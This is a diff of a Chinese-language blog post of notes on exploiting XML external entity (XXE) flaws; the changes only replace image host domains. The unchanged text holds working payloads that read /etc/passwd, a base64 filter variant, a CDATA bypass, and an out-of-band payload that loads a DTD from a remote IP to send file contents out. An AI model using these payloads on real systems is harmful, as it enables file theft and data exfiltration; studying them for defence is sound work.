@@ -11,9 +11,9 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>结果如下</strong></p>
-<p><img src="http://qiniuyun.dnsl0g.top/blog/20190819/a0kJBVemEnx0.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
+<p><img src="http://qiniuyun.dnsl0g.ml/blog/20190819/a0kJBVemEnx0.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
 <p>读取文件种可能会有特殊符号如<code>&amp;</code>,<code>&lt;</code>,<code>&gt;</code>,<code>&quot;</code>,<code>&#39;</code>等会导致读取失败，比如下面读取含有特殊字符文件<code>2.txt</code>失败：</p>
-<p><img src="http://qiniuyun.dnsl0g.top/blog/20190820/uU0qkKQgzgrt.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
+<p><img src="http://qiniuyun.dnsl0g.ml/blog/20190820/uU0qkKQgzgrt.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
 <p>废话不多说，解决办法有两种：</p>
 <ul>
 <li>第一种：将读取文件使用<code>base64</code>编码即可</li>
@@ -22,7 +22,7 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">creds</span> [  </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">goodies</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;goodies;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>结果如下</strong></p>
-<p><img src="http://qiniuyun.dnsl0g.top/blog/20190819/b3jxkk5ssclx.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
+<p><img src="http://qiniuyun.dnsl0g.ml/blog/20190819/b3jxkk5ssclx.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
 <ul>
 <li>第二种：将读取数据放在<code>CDATA</code>中输出进行绕过</li>
 </ul>
@@ -33,7 +33,7 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">all</span> <span class="meta-string">&quot;%start;%goodies;%end;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>结果如下</strong></p>
-<p><img src="http://qiniuyun.dnsl0g.top/blog/20190820/L2e2FpJf6h34.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
+<p><img src="http://qiniuyun.dnsl0g.ml/blog/20190820/L2e2FpJf6h34.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
 <blockquote>
 <p>注意：读取文件时候要注意<code>文件</code>以及<code>文件夹</code>权限问题，否则会读取失败，记录下遇到的这个坑吧，在这浪费了不少时间，烧脑~</p>
 </blockquote>
@@ -52,8 +52,8 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://107.182.30.95/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>在服务器监听端口，发送payload结果如下：</p>
-<p><img src="http://qiniuyun.dnsl0g.top/blog/20190819/vIveUNB3EuEj.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
-<p><img src="http://qiniuyun.dnsl0g.top/blog/20190819/Piw5BFaUg7NS.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
+<p><img src="http://qiniuyun.dnsl0g.ml/blog/20190819/vIveUNB3EuEj.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
+<p><img src="http://qiniuyun.dnsl0g.ml/blog/20190819/Piw5BFaUg7NS.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/2/text/enpxc21pbGUt5Y6f5Yib/font/5a6L5L2T/fontsize/800/fill/I0VDMUY0MQ==/dissolve/51/gravity/Center/dx/10/dy/10%7Cimageslim" alt="mark"></p>
 <hr>
 <p>以上就是XXE基本利用方式总结笔记，当然XXE的危害还有很多，由于时间原因，暂不记录。</p>
 <h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357">1</a></p>
